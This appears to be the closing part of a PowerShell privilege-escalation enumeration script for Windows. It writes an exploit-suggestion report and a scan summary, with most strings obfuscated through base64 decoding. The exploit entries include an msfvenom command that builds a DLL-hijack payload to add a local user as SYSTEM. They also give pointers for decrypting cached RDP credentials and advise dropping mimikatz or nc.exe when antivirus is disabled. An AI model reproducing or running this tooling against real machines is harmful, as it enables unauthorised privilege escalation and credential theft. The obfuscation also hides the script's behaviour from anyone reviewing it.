    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDI='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V3JpdGFibGUgc2VydmljZSBiaW5hcnkgZGlyZWN0b3J5IC0tIERMTCBoaWphY2s='))) @"
  Drop a DLL with a name the service loads (use Procmon on attacker side to identify) into the writable dir.
  When the service starts/restarts, your DLL is loaded as SYSTEM.
  Generate a payload DLL:
    msfvenom -p windows/x64/exec CMD='net user h P@ss /add' -f dll -o <name>.dll
  Writable dirs:
$(($writableSvcDirs | ForEach-Object { "    -> $_" }) -join "`n")
"@
}

# -- P3: Saved RDP files ---------------------------------------------------
if ($rdpFiles.Count -gt 0) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDM='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LnJkcCBmaWxlcyBmb3VuZCAtLSBjaGVjayBmb3IgY2FjaGVkIGNyZWRlbnRpYWxz'))) @"
  RDP files reference targets and may have stored creds (DPAPI-protected blob).
  Decrypt with: https://github.com/Hackndo/dpapi-tools or SharpDPAPI.
  Files:
$(($rdpFiles | ForEach-Object { "    -> $_" }) -join "`n")
"@
}

# -- P3: AV disabled -------------------------------------------------------
$defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($defenderStatus -and -not $defenderStatus.AntivirusEnabled) {
    Exploit-Entry ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UDM='))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('V2luZG93cyBEZWZlbmRlciBpcyBESVNBQkxFRCAtLSBkcm9wIHBheWxvYWRzIHdpdGhvdXQgZXZhc2lvbg=='))) @"
  AV is off. Unsigned or detected payloads may run freely.
  Generate and transfer payloads directly (msfvenom, nc.exe, mimikatz, etc.)
"@
}

# -- Finalise --------------------------------------------------------------
$exploitCount = (Select-String -Path $exploit -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XlxbUA=='))) -ErrorAction SilentlyContinue).Count
Add-Content $exploit ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09')))
Add-Content $exploit (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBUb3RhbCBleHBsb2l0IHBhdGhzIGlkZW50aWZpZWQ6IA=='))) + $exploitCount)
Add-Content $exploit ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ==')))

if ($exploitCount -gt 0) {
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4gICAgW3ZdIFNhdmVkIC0+IA=='))) + $exploit) -ForegroundColor Green
} else {
    Add-Content $exploit ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4gIFstLV0gTm8gYXV0b21hdGVkIGV4cGxvaXQgcGF0aHMgbWF0Y2hlZC4gUmV2aWV3IGZpbmRpbmdzIG1hbnVhbGx5Lg==')))
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4gICAgWy0tXSBObyBhdXRvbWF0ZWQgZXhwbG9pdCBwYXRocyBtYXRjaGVkIC0tIHJldmlldyBtYW51YWxseQ=='))) -ForegroundColor Yellow
}

# ============================================================================
#  SUMMARY
# ============================================================================
$elapsed = [int]((Get-Date) - $startTime).TotalSeconds
$findingsCount = (Select-String -Path $findings -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XlxbISFcXQ=='))) -ErrorAction SilentlyContinue).Count

Add-Content $findings ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09')))
Add-Content $findings (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBUb3RhbCBmaW5kaW5nczog'))) + $findingsCount)
Add-Content $findings ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ==')))

Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ=='))) -ForegroundColor Cyan
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBTQ0FOIENPTVBMRVRF'))) -ForegroundColor Cyan
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Cyan
Write-Host ''
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBEdXJhdGlvbiAgOiA='))) + ${elapsed} + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cw=='))))
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBPdXRwdXQgRGlyOiA='))) + $(Get-Location) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XA=='))) + $main)
Write-Host ''

if ($findingsCount -gt 0) {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICArPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Kw=='))) -ForegroundColor Red
    Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICB8ICBbISFdIA=='))) + $findingsCount + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IEZJTkRJTkcoUykgREVURUNURUQgLS0gcmV2aWV3IDAwLUZJTkRJTkdTLnR4dCAgICAgICAgICB8')))) -ForegroundColor Red
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICArPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Kw=='))) -ForegroundColor Red
    Write-Host ''
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBGaW5kaW5ncyBQcmV2aWV3Og=='))) -ForegroundColor Red
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ==')))
    Select-String -Path $findings -Pattern ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XlxbISFcXQ=='))) | ForEach-Object {
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIA=='))) + $($_.Line)) -ForegroundColor Red
    }
    Write-Host ''
} else {
    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBbdl0gTm8gY3JpdGljYWwgZmluZGluZ3MgZGV0ZWN0ZWQu'))) -ForegroundColor Green
    Write-Host ''
}

Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBGaWxlcyBHZW5lcmF0ZWQ6'))) -ForegroundColor Green
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ==')))
$allFiles = @($findings, $exploit, $sys, $ugo, $svc, $tasks, $reg, $netstuff, $creds, $sw_out, $fs, $history, $devtools)
foreach ($f in $allFiles) {
    if (Test-Path $f) {
        $size = [math]::Round((Get-Item $f).Length / 1KB, 1)
        Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgIFsrXSA='))) + $([System.IO.Path]::GetFileName($f) + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSAgKA=='))) + ${size} + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('S0Ip')))) -ForegroundColor Green
    }
}

Write-Host ''
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBUaXA6IEdldC1Db250ZW50IA=='))) + $findings) -ForegroundColor Yellow
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBUaXA6IEdldC1Db250ZW50IA=='))) + $exploit) -ForegroundColor Yellow
Write-Host (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBUaXA6IFNlbGVjdC1TdHJpbmcgLVBhdGggJw=='))) + $main + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XConIC1QYXR0ZXJuICdwYXNzd29yZHxGSU5ESU5HJw==')))) -ForegroundColor Yellow
Write-Host ''
Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0='))) -ForegroundColor Cyan
